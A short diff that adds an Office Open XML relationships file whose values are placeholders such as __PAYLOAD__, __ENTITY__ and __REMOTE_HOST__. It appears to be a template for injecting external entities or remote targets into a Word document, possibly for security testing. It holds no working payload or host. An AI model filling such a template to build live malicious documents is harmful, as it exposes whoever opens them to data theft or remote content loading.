@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+__PAYLOAD__
+<Relationships xmlns="__REMOTE_HOST__"><Relationship Id="rId3" Type="__REMOTE_HOST__" Target="__REMOTE_HOST__"/><Relationship Id="rId2" Type="__REMOTE_HOST__" Target="settings.xml"/><Relationship Id="rId1" Type="__REMOTE_HOST__" Target="__REMOTE_HOST__"/><Relationship Id="rId5" Type="__REMOTE_HOST__" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="__REMOTE_HOST__" Target="__REMOTE_HOST__"/>__ENTITY__</Relationships>
